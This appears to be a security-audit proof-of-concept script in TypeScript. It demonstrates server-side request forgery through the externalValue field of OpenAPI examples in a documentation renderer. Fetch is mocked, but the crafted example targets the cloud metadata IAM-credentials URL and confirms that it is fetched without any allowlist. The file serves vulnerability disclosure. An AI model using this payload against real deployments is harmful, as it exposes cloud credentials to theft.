/**
 * PoC: SSRF via examples[].externalValue bare fetch() — H5
 *
 * Demonstrates that ExampleModel.getExternalValue() dispatches a bare fetch()
 * to any URL supplied in `externalValue` with no scheme check, no host
 * allowlist, and no reuse of the customFetch wrapper.
 *
 * Run:
 *   npx ts-node --project tsconfig.json -e "require('./archon/findings/H5-ssrf-externalvalue-fetch-no-allowlist/evidence/poc.ts')"
 *
 * Or via Jest (ts-jest preset already configured):
 *   npx jest --testPathPattern poc.ts --no-coverage
 *
 * The script exercises the *real* ExampleModel class from the production
 * source tree (src/services/models/Example.ts) — not a harness copy.
 */

// Minimal stub for OpenAPIParser — only the two properties ExampleModel reads.
const stubParser = {
  // specUrl drives URL resolution; use a dummy base that makes absolute URLs
  // resolve as-is and relative URLs resolve against it.
  specUrl: 'http://[REDACTED].corp/api/openapi.yaml',
  deref<T>(ref: T): { resolved: T } {
    return { resolved: ref };
  },
};

// ----------------------------------------------------------------------------
// Intercept global fetch BEFORE importing ExampleModel so that the cache
// (module-level `externalExamplesCache`) is populated with our intercepted
// promise.  We record every URL that fetch() is called with.
// ----------------------------------------------------------------------------
const capturedRequests: string[] = [];

// Polyfill fetch in the Node.js environment with our spy.
(global as any).fetch = (url: string, _init?: RequestInit): Promise<Response> => {
  capturedRequests.push(url);
  // Return a minimal Response-like object so getExternalValue() resolves.
  const body = '{"instance-id":"i-deadbeef","iam-role":"ssrf-victim-role"}';
  return Promise.resolve({
    ok: true,
    text: () => Promise.resolve(body),
  } as unknown as Response);
};

// ----------------------------------------------------------------------------
// Import the real production class — this ensures the PoC runs through the
// actual source, not a copy.
// ----------------------------------------------------------------------------
import { ExampleModel } from '../../../../src/services/models/Example';

// ----------------------------------------------------------------------------
// Build a spec example object that mimics what OpenAPI parser produces when
// it encounters:
//
//   examples:
//     internalLeak:
//       externalValue: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
//
// ----------------------------------------------------------------------------
const SSRF_TARGET = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';

const maliciousExampleSpec = {
  // No `value` field — forces the ExternalExample rendering branch.
  externalValue: SSRF_TARGET,
  summary: 'Attacker-injected example',
};

const mimeType = 'application/json';

// ----------------------------------------------------------------------------
// Exercise the vulnerable code path.
// ----------------------------------------------------------------------------
async function run() {
  console.log('[H5-PoC] Instantiating ExampleModel with attacker-controlled externalValue...');
  console.log(`[H5-PoC] SSRF target: ${SSRF_TARGET}`);

  // ExampleModel constructor (line 23-25 of Example.ts):
  //   this.externalValueUrl = new URL(example.externalValue, parser.specUrl).href;
  // — no scheme check, no allowlist.
  const model = new ExampleModel(
    stubParser as any,
    maliciousExampleSpec as any,
    mimeType,
  );

  console.log(`[H5-PoC] ExampleModel.externalValueUrl resolved to: ${model.externalValueUrl}`);

  if (model.externalValueUrl !== SSRF_TARGET) {
    const result = {
      status: 'failed',
      evidence: `URL was mutated: expected ${SSRF_TARGET}, got ${model.externalValueUrl}`,
      notes: 'Unexpected URL transformation — finding may be invalid.',
    };
    console.log(JSON.stringify(result));
    process.exit(1);
  }

  console.log('[H5-PoC] Calling getExternalValue() — this triggers bare fetch()...');

  // getExternalValue() at Example.ts:41:
  //   externalExamplesCache[this.externalValueUrl] = fetch(this.externalValueUrl)…
  const value = await model.getExternalValue(mimeType);

  console.log(`[H5-PoC] fetch() returned body: ${JSON.stringify(value)}`);
  console.log(`[H5-PoC] Total fetch() calls intercepted: ${capturedRequests.length}`);
  console.log(`[H5-PoC] URLs dispatched to fetch(): ${JSON.stringify(capturedRequests)}`);

  // Validate exploit success conditions:
  //   1. fetch() was actually invoked (not short-circuited).
  //   2. The exact SSRF_TARGET URL was passed — no scheme stripping, no host override.
  //   3. No allowlist rejection occurred (we'd see an Error thrown instead of a value).
  const ssrfUrlFetched = capturedRequests.includes(SSRF_TARGET);
  const noAllowlistError = !(value instanceof Error);

  if (ssrfUrlFetched && noAllowlistError) {
    console.log('[H5-PoC] SUCCESS: SSRF confirmed. fetch() dispatched to arbitrary internal URL.');
    console.log('[H5-PoC] In a real browser, this request reaches the metadata endpoint.');
    console.log('[H5-PoC] If CORS permits (or same-origin), the IAM credential body is rendered in the docs UI.');
    // REQUIRED: last line must be the JSON result object.
    console.log(JSON.stringify({
      status: 'confirmed',
      evidence: `bare fetch() dispatched to ${SSRF_TARGET} with no allowlist check; ExampleModel.externalValueUrl=${model.externalValueUrl}; response body rendered: ${JSON.stringify(value)}`,
      notes: 'ExampleModel.getExternalValue() at src/services/models/Example.ts:41 calls fetch() directly; no scheme/host validation; URL derived verbatim from spec externalValue field.',
    }));
  } else {
    console.log('[H5-PoC] FAILED: expected conditions not met.');
    console.log(JSON.stringify({
      status: 'failed',
      evidence: `ssrfUrlFetched=${ssrfUrlFetched} noAllowlistError=${noAllowlistError} capturedRequests=${JSON.stringify(capturedRequests)}`,
      notes: 'Exploit conditions not satisfied — review PoC or finding.',
    }));
    process.exit(1);
  }
}

run().catch(err => {
  console.error('[H5-PoC] Unhandled error:', err);
  console.log(JSON.stringify({ status: 'failed', evidence: String(err), notes: 'PoC threw unexpectedly.' }));
  process.exit(1);
});
